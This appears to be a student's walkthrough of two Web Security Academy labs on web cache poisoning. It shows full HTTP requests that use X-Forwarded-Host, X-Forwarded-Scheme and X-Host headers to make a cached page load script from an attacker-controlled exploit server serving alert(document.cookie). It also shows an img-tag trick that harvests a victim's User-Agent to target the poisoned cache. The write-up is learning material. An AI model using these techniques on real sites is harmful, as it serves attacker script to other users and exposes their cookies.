Task 3:
///Lab: Web cache poisoning with multiple headers///

Open the site in burp. Send the / request and the GET /resources/js/tracking.js request to repeater.
To validate its vulnerable, do the same like before (add ?as=asd to the get request...etc...)
In the lab description: 'This lab supports both the X-Forwarded-Host and X-Forwarded-Scheme headers.'
So the starting request is:
GET /?cb=asd HTTP/2
Host: 0a0b007c0381086e80e562df003000a0.web-security-academy.net
Cookie: session=BIx4h3UkLh11kclE1onXwEVYEgojV3oJ
....
Ive tried the Host header, but nothing changed, so i tried Scheme header like:
GET /?cb=asds HTTP/2
Host: 0a0b007c0381086e80e562df003000a0.web-security-academy.net
Cookie: session=BIx4h3UkLh11kclE1onXwEVYEgojV3oJ
...
X-Forwarded-Scheme: http
Dont forget to change the cache buster value! If you send this request, you will get a 302 found, so our request got redirected...but where? that was the x-forwarded-host will give us. So modify the request:
GET /?cb=asdssx HTTP/2
Host: 0a0b007c0381086e80e562df003000a0.web-security-academy.net
Cookie: session=BIx4h3UkLh11kclE1onXwEVYEgojV3oJ
...
...
X-Forwarded-Scheme: nothttp
X-Forwarded-Host: google.com
And if you open this page, it will redirect you to google.com/?cb=asds. But how can we use this?
We have a script request, and we have an exploit server. First modify the exploit server...
To the File: part copy into: /resources/js/tracking.js >>>this will be our requests route...
To the body part: alert(document.cookie);
And store it.
Copy out the exploit server address.
Now modify the script request like this:
GET /resources/js/tracking.js HTTP/2
Host: 0a0b007c0381086e80e562df003000a0.web-security-academy.net
Cookie: session=BIx4h3UkLh11kclE1onXwEVYEgojV3oJ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://0a0b007c0381086e80e562df003000a0.web-security-academy.net/
Sec-Fetch-Dest: script
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Te: trailers
X-Forwarded-Scheme: http
X-Forwarded-Host: exploit-0a2b00ec035108fc808e612501b2002f.exploit-server.net

As you can see i copied the two vulnerable headers into the request, and i give our exploit server as the redirection. What will this do? If we send this request this will redirect
us to exploit-0a2b00ec035108fc808e612501b2002f.exploit-server.net/resources/js/tracking.js which will be the: alert(document.cookie);
So when the page loads in, and this runs down, we will get an alert. So send the request until we get x-cache: hit. And refresh the page in the browser.

Task 4:
///Lab: Targeted web cache poisoning using an unknown header///

Open the site in burp. Sen the GET / request to repeater. In burpsuit there is an extension called 'Param miner'. install it. then go to the http history, and click on the GET / request with right mouse button,
pick extensions/param miner/guess headers. From the result you can see which X header is vulnerable:
Identified parameter on 0ad5006704768c90801f03e300e7009c.h1-web-security-academy.net: x-host~%h:%s
So its the X-host. Now Add the new line to the request like this:
GET / HTTP/1.1
Host: 0ad5006704768c90801f03e300e7009c.h1-web-security-academy.net
X-Host: exploit-0ad000b104bf8c5a80a702b601e3004a.exploit-server.net
Cookie: session=vWihLhx2ucqESBKW3F7fvzcKAgPmdJGr
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
.....
Send this request, and search on the 'exploit-0ad000b104bf8c5a80a702b601e3004a' in the source code:
       <script type="text/javascript" src="//exploit-0ad000b104bf8c5a80a702b601e3004a.exploit-server.net/resources/js/tracking.js"></script>
Copy this out: /resources/js/tracking.js Go to the exploit server and paste this line into the File: part. To the body part: alert(document.cookie); and store it. Send it until X-cache wont be equal with 'hit'.
Now for us its alerting the site, but we have to send it to the victim somehow. Here is an importart thing what we have to notice..which is a header:Vary: User-Agent. This header means that if you have 
a different version from the browser then the victim, the vulnerability wont work. and we have to figure out somehow, what browser the victim use. To figure out, make a post with the following message:
<img src="https://https://exploit-0ad000b104bf8c5a80a702b601e3004a.exploit-server.net/resources/js/tracking.js" />
Refresh the page for a few times, and go to your exploit servers log. you will see something like this:
10.0.4.140      2026-04-01 14:20:40 +0000 "GET /foo HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
Copy out the Mozilla/5....537.36 and paste into our repeater request like this:
GET / HTTP/1.1
Host: 0ad5006704768c90801f03e300e7009c.h1-web-security-academy.net
X-Host: exploit-0ad000b104bf8c5a80a702b601e3004a.exploit-server.net
Cookie: session=vWihLhx2ucqESBKW3F7fvzcKAgPmdJGr
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
...

Send this request many times, and if the victim checked the site the alert will load in, and we solved the lab.
